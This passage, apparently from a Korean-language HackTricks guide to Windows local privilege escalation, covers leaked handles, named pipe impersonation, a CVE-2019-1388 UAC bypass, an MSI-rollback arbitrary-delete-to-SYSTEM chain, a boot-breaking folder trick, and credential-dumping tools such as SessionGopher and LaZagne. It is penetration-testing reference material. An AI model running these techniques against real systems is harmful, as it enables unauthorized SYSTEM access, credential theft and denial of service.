도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 이 데이터를 평문으로 저장하는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)에서 **sessions**, **usernames** 및 **passwords** 를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **SYSTEM 권한으로 실행되는 프로세스가 새 프로세스를 연다** (`OpenProcess()`) **전체 권한**으로. The same process **또 다른 새 프로세스를 생성한다** (`CreateProcess()`) **권한이 낮지만 메인 프로세스의 모든 열린 핸들을 상속하는**.\
Then, if you have **해당 권한이 낮은 프로세스에 대한 전체 권한**, you can grab the **`OpenProcess()`로 생성된 권한 프로세스의 열린 핸들** and **쉘코드를 주입할 수 있다**.\
[이 취약점을 어떻게 탐지하고 악용할지에 대한 자세한 정보는 이 예제를 읽어보라.](leaked-handle-exploitation.md)\
[이 프로세스 및 스레드에서 상속된 다양한 권한 수준의 열린 핸들을 테스트하고 남용하는 방법(단순히 full access만이 아님)에 대한 더 완전한 설명은 이 다른 포스트를 읽어보라.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

공유 메모리 세그먼트로서, **pipes**라고 불리는 것은 프로세스 간 통신과 데이터 전송을 가능하게 한다.

Windows는 **Named Pipes**라는 기능을 제공하여, 서로 관련 없는 프로세스들이 심지어 다른 네트워크 상에서도 데이터를 공유할 수 있게 한다. 이는 클라이언트/서버 아키텍처와 유사하며, 역할은 **named pipe server**와 **named pipe client**로 정의된다.

클라이언트가 파이프를 통해 데이터를 보낼 때, 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한이 있다면 **클라이언트의 신분을 대리할 수 있는 능력**을 가진다. 파이프를 통해 통신하는 **권한 높은 프로세스**를 식별하고 그 프로세스를 흉내낼 수 있다면, 해당 프로세스가 당신이 만든 파이프와 상호작용할 때 그 프로세스의 신분을 채택하여 **더 높은 권한을 획득할 기회**가 생긴다. 이런 공격을 수행하는 방법에 대한 안내는 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 찾을 수 있다.

또한 다음 도구들은 **burp와 같은 툴로 named pipe 통신을 가로채는** 데 도움이 된다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 모든 파이프를 나열하고 확인하여 privescs를 찾는 데 도움을 준다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

사용자 권한으로 셸을 획득했을 때, 예약된 작업이나 다른 프로세스들이 **명령줄에 자격 증명을 전달하는** 경우가 있을 수 있다. 아래 스크립트는 프로세스의 명령줄을 2초마다 캡처하여 현재 상태를 이전 상태와 비교하고, 변경된 부분을 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 암호 탈취

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스 (via console or RDP)에 접근할 수 있고 UAC가 활성화되어 있는 경우, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로부터 "NT\AUTHORITY SYSTEM"과 같은 터미널이나 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 취약점을 통해 권한 상승과 UAC 우회가 동시에 가능해집니다. 또한 아무것도 설치할 필요가 없으며, 과정 중 사용되는 바이너리는 Microsoft에서 서명되고 발급된 것입니다.

영향을 받는 시스템의 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

무결성 레벨에 대해 배우려면 다음을 읽으세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그런 다음 UAC 및 UAC 우회에 대해 배우려면 다음을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

이 기법은 [**이 블로그 포스트에서 설명된**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 내용과, [**여기서 이용 가능한**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit 코드를 기반으로 합니다.

공격은 기본적으로 Windows Installer의 rollback 기능을 악용하여 정당한 파일을 제거/제거 과정 중에 악성 파일로 교체하는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재킹하기 위한 **malicious MSI installer**를 만들어야 하며, 이후 다른 MSI 패키지의 제거 과정에서 Windows Installer가 rollback 파일을 저장할 때 해당 rollback 파일들이 악성 페이로드로 수정되게 됩니다.

요약된 기법은 다음과 같습니다:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Writable 폴더(`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 인스톨러를 **"UAC Compliant"**로 표시하여 **non-admin user**도 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열어 둡니다.

- Step 2: Begin Uninstall
- 동일한 `.msi`를 제거(uninstall)합니다.
- 제거 과정에서 파일들이 `C:\Config.Msi`로 옮겨지고 `.rbf`로 이름이 바뀌어(rollback 백업) 저장됩니다.
- 파일이 `C:\Config.Msi\<random>.rbf`가 되었는지를 감지하기 위해 `GetFinalPathNameByHandle`을 사용해 열린 파일 핸들을 폴링합니다.

- Step 3: Custom Syncing
- `.msi`에는 다음과 같은 **custom uninstall action (`SyncOnRbfWritten`)**가 포함되어 있습니다:
- `.rbf`가 쓰여졌음을 신호(signal)합니다.
- 그 다음 제거를 계속하기 전에 다른 이벤트를 **기다립니다**.

- Step 4: Block Deletion of `.rbf`
- 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **오픈**하여 삭제를 **차단**합니다.
- 그런 다음 제거가 완료될 수 있도록 **신호를 다시 보냅니다**.
- Windows Installer는 `.rbf`를 삭제하지 못하고, 모든 내용을 삭제할 수 없기 때문에 **`C:\Config.Msi`는 삭제되지 않습니다**.

- Step 5: Manually Delete `.rbf`
- 공격자는 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`는 비어있게** 되며, 하이재킹할 준비가 됩니다.

> 이 시점에서, `C:\Config.Msi`를 삭제하도록 SYSTEM 권한 수준의 arbitrary folder delete 취약점을 트리거하세요.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 직접 `C:\Config.Msi` 폴더를 다시 만듭니다.
- 약한 DACL(예: Everyone:F)을 설정하고 `WRITE_DAC` 권한으로 **핸들**을 열어 둡니다.

- Step 7: Run Another Install
- `.msi`를 다시 설치합니다:
- `TARGETDIR`: 쓰기 가능한 위치.
- `ERROROUT`: 강제 실패를 유발하는 변수.
- 이 설치는 다시 **rollback**을 트리거하는 데 사용됩니다(rollback은 `.rbs`와 `.rbf`를 읽습니다).

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하여 새 `.rbs`가 나타날 때까지 기다립니다.
- 그 파일명을 캡처합니다.

- Step 9: Sync Before Rollback
- `.msi`에는 다음과 같은 **custom install action (`SyncBeforeRollback`)**가 있습니다:
- `.rbs`가 생성되었을 때 이벤트를 신호합니다.
- 그 다음 계속하기 전에 **기다립니다**.

- Step 10: Reapply Weak ACL
- `.rbs created` 이벤트를 받으면:
- Windows Installer는 `C:\Config.Msi`에 대해 강한 ACL을 다시 적용합니다.
- 하지만 당신은 여전히 `WRITE_DAC` 핸들을 가지고 있으므로 약한 ACL을 **다시 적용**할 수 있습니다.

> ACL은 **핸들 오픈 시에만 적용**되므로, 여전히 폴더에 쓸 수 있습니다.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` 파일을 덮어써서 Windows가 다음을 수행하도록 하는 **가짜 rollback 스크립트**를 넣습니다:
- 당신의 `.rbf`(malicious DLL)를 **권한 있는 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)로 복원하도록 지시.
- SYSTEM 레벨 페이로드 DLL을 포함한 가짜 `.rbf`를 배치합니다.

- Step 12: Trigger the Rollback
- 동기화 이벤트를 신호하여 인스톨러가 계속 진행되도록 합니다.
- 알려진 지점에서 의도적으로 설치를 실패시키기 위해 **type 19 custom action (`ErrorOut`)**가 설정되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer는 당신의 악성 `.rbs`를 읽고,
- 대상 위치에 당신의 `.rbf` DLL을 복사합니다.
- 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 설치**되었습니다.

- Final Step: Execute SYSTEM Code
- 신뢰되는 **auto-elevated binary**(예: `osk.exe`)를 실행하여 하이재킹한 DLL을 로드하게 합니다.
- Boom: 당신의 코드는 **SYSTEM으로 실행**됩니다.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

주된 MSI rollback 기법(위의 방법)은 전체 폴더(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 하지만 취약점이 **임의 파일 삭제만 허용**한다면 어떻게 할까요?

NTFS 내부 구조를 악용할 수 있습니다: 모든 폴더는 다음과 같은 숨겨진 alternate data stream을 가지고 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **index metadata**를 저장합니다.

따라서, 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면**, NTFS는 파일 시스템에서 **해당 폴더 전체를 제거합니다**.

다음과 같은 표준 파일 삭제 API를 사용하여 이 작업을 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API를 호출하더라도, 실제로는 **folder 자체를 삭제합니다**.

### From Folder Contents Delete to SYSTEM EoP
만약 당신의 primitive가 임의의 files/folders를 삭제할 수 없지만, attacker-controlled folder의 *contents*를 삭제하는 것은 **허용**한다면?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- 권한이 높은 프로세스가 `file1.txt`를 삭제하려고 할 때, 해당 oplock은 **실행을 일시중지**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 3단계: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 검사하여 내부 파일들을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면, **oplock이 트리거되어** 제어를 당신의 callback으로 넘깁니다.

4. 4단계: oplock callback 내부 – 삭제 리다이렉트

- 옵션 A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock을 해제하지 않고 `folder1`을 비울 수 있습니다.
- `file1.txt`를 직접 삭제하지 마세요 — 그렇게 하면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink** 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이 공격은 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 겨냥합니다 — 이를 삭제하면 폴더가 삭제됩니다.

5. oplock 해제
- SYSTEM 프로세스는 계속 실행되며 `file1.txt`를 삭제하려고 시도합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제되는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`는 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 영구 DoS까지

primitive를 악용하면, 파일을 쓸 수 없거나 권한을 약하게 설정할 수 없어도 **create an arbitrary folder as SYSTEM/admin**할 수 있습니다.

예: **critical Windows driver**의 이름으로 **folder**(파일이 아닌)를 생성하세요:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 보통 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 그것을 **폴더로 미리 생성**하면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중에 `cng.sys`를 로드하려 시도합니다.
- 폴더를 발견하면 **실제 드라이버를 해결하지 못하고**, **시스템이 충돌하거나 부팅이 중단**됩니다.
- 외부 개입(예: 부팅 수리 또는 디스크 접근) 없이는 **대체(fallback)**도 없고, **복구(recovery)**도 없습니다.


## **From High Integrity to System**

### **New service**

이미 High Integrity 프로세스에서 실행 중이라면, **path to SYSTEM**은 단지 **새로운 service를 생성하고 실행하는 것**으로 쉽게 얻을 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 만들 때, 그것이 유효한 서비스인지 또는 바이너리가 필요한 동작을 빠르게 수행하는지 확인하세요. 유효한 서비스가 아니면 20초 이내에 종료됩니다.

### AlwaysInstallElevated

High Integrity 프로세스에서 **AlwaysInstallElevated 레지스트리 항목을 활성화**하고 _**.msi**_ 래퍼를 사용해 reverse shell을 **설치**해볼 수 있습니다.\
[레지스트리 키와 _.msi_ 패키지 설치 방법에 대한 자세한 정보는 여기를 참조하세요.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**다음에서 코드를 확인할 수 있습니다** [**코드 보기**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 토큰 권한(보통 이미 High Integrity 프로세스에서 발견됩니다)이 있으면 SeDebug 권한으로 거의 모든 프로세스(Protected Process 제외)를 **열 수** 있고, 해당 프로세스의 토큰을 **복사**한 뒤 그 토큰으로 **임의의 프로세스 생성**이 가능합니다.\
이 기법은 보통 모든 토큰 권한을 가진 SYSTEM으로 실행 중인 프로세스를 **선택**하는 방식으로 사용됩니다(_예, 모든 토큰 권한이 없는 SYSTEM 프로세스도 존재합니다_).\
**예시 코드(제안된 기법을 실행하는 코드)는 여기에서 확인할 수 있습니다:** [**example**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기법은 meterpreter가 `getsystem`을 수행할 때 사용됩니다. 기법은 파이프를 생성한 다음 서비스를 생성/악용하여 해당 파이프에 쓰게 만드는 방식으로 구성됩니다. 그런 다음, 파이프를 생성한 **서버**는 **`SeImpersonate`** 권한을 사용해 파이프 클라이언트(서비스)의 토큰을 **impersonate**하여 SYSTEM 권한을 얻을 수 있습니다.\
[**name pipes에 대해 더 알고 싶다면 이 글을 읽으세요**](#named-pipe-client-impersonation).\
[name pipes를 사용해 high integrity에서 System으로 올라가는 예제를 읽고 싶다면 이 글을 보세요](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

만약 SYSTEM으로 실행되는 **프로세스**에 의해 로드되는 dll을 **hijack**할 수 있다면, 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이런 유형의 권한 상승에 유용하며, 특히 high integrity 프로세스에서는 더 **쉽게 달성**할 수 있습니다. 이는 high integrity 프로세스가 dll을 로드하는 폴더에 **쓰기 권한**을 가지기 때문입니다.\
**자세한 내용은 여기에서 확인하세요:** [**Dll hijacking 정보**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**읽어보기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows 로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 설정 오류 및 민감한 파일 검사 (**[**여기 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 감지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 가능한 설정 오류를 검사하고 정보 수집 (**[**여기 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 설정 오류 검사**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장 세션 정보를 추출합니다. 로컬에서는 -Thorough 옵션 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명 추출. 감지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 암호를 도메인에 대량 분산 시도**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 MITM 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 privesc Windows 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점 검색 (DEPRECATED: Watson으로 대체) \
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점 검색(VisualStudio로 컴파일 필요) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 호스트를 열거하여 설정 오류를 찾음(권한 상승 도구라기보다 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 소프트웨어에서 자격 증명 추출 (GitHub에 precompiled exe 존재)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 설정 오류 검사 (GitHub에 실행파일 있음). 권장하지 않음. Win10에서 잘 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 설정 오류 검사 (python으로 만든 exe). 권장하지 않음. Win10에서 잘 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 해당 게시물을 기반으로 만든 도구(정상 작동을 위해 accesschk가 필요하지 않지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**의 출력을 읽어 동작 가능한 익스플로잇을 추천 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**의 출력을 읽어 동작 가능한 익스플로잇을 추천 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트를 컴파일할 때 올바른 버전의 .NET을 사용해야 합니다 ([참고](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 호스트에 설치된 .NET 버전을 확인하려면 다음을 실행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고 자료

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) 및 kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
